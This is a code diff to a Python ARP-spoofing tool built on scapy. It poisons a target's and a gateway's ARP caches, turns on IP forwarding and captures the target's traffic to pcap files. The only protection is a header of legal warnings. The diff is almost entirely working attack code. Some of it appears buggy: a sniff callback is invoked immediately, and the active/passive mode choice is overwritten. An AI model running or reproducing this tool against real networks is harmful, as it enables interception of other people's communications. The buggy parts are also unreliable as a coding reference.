@@ -5,8 +5,8 @@ Unauthorized network interference violates:
 - 18 U.S. Code § 1030 (CFAA)
 - Computer Misuse Act 1990 (UK)
 - 刑法第285条 (中国大陆)
-
-仅限授权测试使用！攻击他人网络将面临刑事指控。
+- 仅限授权测试使用！攻击他人网络将面临刑事指控。
+- No script kiddies allowed! 
 '''
 from multiprocessing import Process, Event
 from ipaddress import ip_address
@@ -14,7 +14,7 @@ from scapy.all import ARP, Ether, conf, sendp, sniff, srp, wrpcap # type: ignore
 from datetime import datetime
 from time import sleep
 import argparse
-import atexit
+import signal
 import sys
 import os
 
@@ -25,26 +25,6 @@ def get_mac(target_ip):
     for _, r in resp:
         return r[Ether].src
     return None
-
-def enable_forwarding():
-    try:
-        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
-            if f.read().strip() == 1:
-                return
-        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-            f.write('1\n')
-    except Exception as e:
-        print(e)
-        exit(1)
-    def restore():
-        try:
-            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-                f.write('0\n')
-        except Exception as e:
-            print(e)
-            exit(1)
-    atexit.register(restore)
-
 
 class Arper:
     def __init__(self, target: str, gateway: str, interface:str, count: int = 200, delay=2, autorestore: bool = True, active=True):
@@ -73,7 +53,6 @@ class Arper:
         self.delay = delay
         self.active = active
         self.poison_event = Event()
-        self.sniff_event = Event()
         self.sniff_process: Process
         conf.iface = interface
         conf.verb = 0
@@ -84,13 +63,15 @@ class Arper:
         print('-' * 30)
 
     def run(self):
-        attacker = ActiveAttacker() if self.active else PassiveAttacker()
-        attacker.start(self)
+        with Context():
+            attacker = ActiveAttacker() if self.active else PassiveAttacker()
+            attacker = ActiveAttacker()
+            attacker.start(self)
 
             
 class ActiveAttacker:
     
-    def poison(self, arper: Arper):
+    def poison(self, arper: Arper, event: Event):
         ether1 = Ether(dst=arper.target_mac)
         arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
         poison_target = ether1 / arp1
@@ -114,7 +95,7 @@ class ActiveAttacker:
         print('-' * 30)
         print('Beginning the ARP poison. [CTRL-C to stop]')
 
-        while not arper.poison_event.wait(0):
+        while not event.wait(0):
             sys.stdout.write('.')
             sys.stdout.flush()
             try:
@@ -132,10 +113,13 @@ class ActiveAttacker:
     def sniff_and_store(self, arper: Arper):
         print(f'Sniffing {arper.count} packets')
         bpf_filter = f'host {arper.target} and not arp'
+        signal.signal(signal.SIGINT, signal.SIG_DFL)
         packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)
+        if len(packets) == 0:
+            print('Aborted')
         arper.poison_event.set()
         wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
-        print('Got the packets')
+        print(f'Got {len(packets)} packets')
 
     def restore(self, arper: Arper):
         '''
@@ -169,24 +153,71 @@ class ActiveAttacker:
                 count=5)
     
     def start(self, arper:Arper):
-        arper.sniff_process = Process(target=self.sniff_and_store)
-        arper.sniff_process.start()
-        sleep(1)
-        poison_process = Process(target=self.poison)
-        poison_process.start()
-        arper.sniff_process.join()
-        poison_process.join()
+        try:
+            arper.sniff_process = Process(target=self.sniff_and_store, args=[arper])
+            arper.sniff_process.start()
+            sleep(1)
+            poison_process = Process(target=self.poison, args=[arper, arper.poison_event])
+            poison_process.start()
+        except KeyboardInterrupt:
+            arper.poison_event.set()
+        finally:
+            arper.sniff_process.join()
+            try:
+                poison_process.join()
+            except:
+                pass
 
 class PassiveAttacker:
 
     def poison(self, arper: Arper):
-        pass
+        ether1 = Ether(dst=arper.target_mac)
+        arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
+        poison_target = ether1 / arp1
+        ether2 = Ether(dst=arper.gateway_mac)
+        arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
+        poison_gateway = ether2 / arp2
+        packet = (poison_gateway, poison_target)
+        sniff(filter=f'host {arper.target} and arp', prn=sendp(packet), store=0)
 
     def sniff_and_store(self, arper: Arper):
-        pass
+        print(f'Sniffing {arper.count} packets')
+        bpf_filter = f'host {arper.target} and not arp'
+        packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)
+        if len(packets) == 0:
+            print('Aborted')
+        arper.poison_event.set()
+        wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
+        print(f'Got {len(packets)} packets')
 
     def start(self, arper: Arper):
-        pass
+        try:
+            arper.sniff_process = Process(target=self.sniff_and_store)
+            arper.sniff_process.start()
+            sleep(1)
+            poison_process = Process(target=self.poison)
+            poison_process.start()
+        except KeyboardInterrupt:   # Aborted
+            arper.poison_event.set()
+        finally:
+            arper.sniff_process.join()
+            try:
+                poison_process.join()   # The process may not have started up
+            except:
+                pass
+
+class Context:
+    def __enter__(self):
+        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
+            self.original_value = f.read().strip()
+        if self.original_value != '1':
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+                f.write('1\n')
+        return self
+    
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+            f.write(self.original_value + '\n')
 
 
 if __name__ == '__main__':
@@ -194,7 +225,6 @@ if __name__ == '__main__':
     if os.getuid() != 0:
         print('Run it as root.')
         exit(1)
-    enable_forwarding()
     parser = argparse.ArgumentParser(description='Perform ARP spoofing on the target machine')
     parser.add_argument('target',  help='IPv4 address of target machine')
     parser.add_argument('-g', '--g', metavar='gateway', required=True, help='IPv4 addr of gateway', dest='gateway')
